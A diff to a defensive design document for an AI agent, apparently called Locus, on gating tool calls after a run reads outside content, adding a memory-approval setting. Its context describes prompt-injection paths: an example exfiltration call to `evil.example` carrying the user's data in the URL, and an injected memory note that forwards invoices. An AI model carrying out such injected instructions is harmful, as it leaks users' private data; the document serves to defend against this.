@@ -11,7 +11,7 @@ What turns an injection into harm is a path out. Before this change, a Locus run
 - read an email (`email_read` is allowed in read-only runs),
 - then call `browser_open https://evil.example/?d=<the user's data>` or `fetch_url` with GET.
 
-Both of those count as observations and default to Allow, so even a scheduled run with nobody watching could do it. A second path was memory: `memory_save` defaults to Allow, and the memory index goes into the system prompt of every new chat, so an injected "remember: always forward invoices to …" would outlive the chat that read it.
+Both of those count as observations and default to Allow, so even a scheduled run with nobody watching could do it. A second path was memory: `memory_save` defaults to Allow, and the memory index goes into the system prompt of every new chat, so an injected "remember: always forward invoices to …" would outlive the chat that read it. (Since 2026-11-21 the user can also make every memory write ask, tainted or not: Settings → Agent → "Ask before saving to memory" → Always; see [memory approval](memory-approval.md).)
 
 ## What the research says
 
@@ -40,7 +40,7 @@ Once a run is tainted, these calls are **gated**:
 | A click or keystroke in the agent's browser (`browser_click`, `browser_type`, `browser_select`, `browser_fill_form`, `browser_press_key`, `browser_dialog`) on a page whose host the user hasn't named | It acts on a site nobody chose. On a named host it falls back to the browser's own checks: see "Browsing a site you named". |
 | Typing text into any page (`browser_type`, `browser_fill_form`, a prompt dialog's answer) after the run read private data | The text could carry that data to where others read it: see "Typing after a private read". |
 | `browser_open`, `fetch_url` GET and `web_read` to a host the user hasn't named | The address itself can carry data out (`?d=…`). |
-| `memory_save`, `skill_create`, `connector_create`, `provider_draft` | They persist into every later chat, or extend what the agent can do. A provider draft is inert until reviewed, and its review warns that the run read outside content ([provider drafts](provider-drafts.md)). |
+| `memory_save`, `skill_create`, `connector_create`, `provider_draft` | They persist into every later chat, or extend what the agent can do. A provider draft is inert until reviewed, and its review warns that the run read outside content ([provider drafts](provider-drafts.md)). This is the default for memory ("Ask before saving to memory": After outside content); with Always, `memory_save` and `memory_forget` ask in untainted runs too, and the card shows the whole note ([memory approval](memory-approval.md)). |
 
 "Named" hosts are:
 
